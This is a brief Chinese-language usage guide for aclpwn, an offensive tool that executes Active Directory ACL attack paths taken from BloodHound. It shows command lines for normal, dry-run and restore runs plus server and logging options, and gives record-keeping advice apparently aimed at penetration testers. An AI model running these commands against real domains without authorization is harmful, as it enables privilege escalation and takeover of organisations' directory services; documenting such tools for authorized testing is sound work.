# aclpwn 使用

aclpwn 主要用来把 BloodHound 里已经看清楚的 ACL 路径真正跑一遍。路径图看着顺，不代表执行时也顺，尤其是涉及对象所有权、写权限、委派链的时候，细节很容易在中途变掉。

## 先看输入

```bash
aclpwn -f path.json -d domain.local -u user -p pass
```

```bash
aclpwn -f path.json -d domain.local -u user -p pass --dry
```

```bash
aclpwn -f path.json -d domain.local -u user -p pass --restore restore.json
```

`path.json` 里记录的对象链要先核对一遍，名字、域名、可写对象和中间依赖都别省。`--dry` 很值得先跑，至少能看出流程顺序有没有问题，省得一上来就改现场。

## 常用补充

```bash
aclpwn -f path.json -d domain.local -u user -p pass --server dc01.domain.local
```

```bash
aclpwn -f path.json -d domain.local -u user -p pass --no-color
```

显式写 `--server` 后，输出通常更稳定，特别是多域、跳板机、DNS 解析不干净的时候。`--no-color` 适合把日志直接落文件，后面对照 restore 信息时更省眼睛。

## 结果整理

执行完别只看成败。中间改了哪个对象、哪个步骤最先报错、回滚文件有没有把变化完整记回，这些都要留住。aclpwn 真正麻烦的地方通常不在执行，而在事后回头补材料。

## 习惯

路径长的时候，建议把原始 BloodHound 截图、path.json、restore.json 放在同一个目录。隔几天再看时，这些材料能直接把上下文拎起来。
